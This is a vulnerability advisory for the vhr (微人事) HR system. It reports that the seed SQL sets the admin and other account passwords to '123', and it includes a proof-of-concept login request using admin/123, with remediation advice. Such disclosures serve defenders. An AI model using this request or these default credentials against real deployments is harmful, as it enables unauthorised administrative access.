# vhr（微人事） — Default Weak Credentials in vhr.sql (VHR-VULN-008)

| Field | Value |
|-------|-------|
| **Vendor** | lenve |
| **Product** | vhr（微人事） |
| **Version** | 1.0-SNAPSHOT |
| **Type** | Use of Default Credentials |
| **CWE** | CWE-1392 |
| **Authentication** | None (login endpoint) |

## Summary

Seed data sets admin/libai/hanyu passwords to `123` (BCrypt).

## Root cause

`vhr.sql` default INSERT statements; no forced password change on deploy.

## Proof of Concept

```http
POST /doLogin HTTP/1.1
Host: TARGET
Content-Type: application/json;charset=UTF-8
Cookie: JSESSIONID=SESSION
Connection: close

{"username":"admin","password":"123","code":"CODE"}
```

**Expected:** {"status":200,"msg":"登录成功!"}

## Impact

Immediate admin compromise on default deployments.

## Remediation

Randomize seed passwords; enforce change on first login.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §VHR-VULN-008
- PoC: `POC_VERIFICATION_REPORT.md`
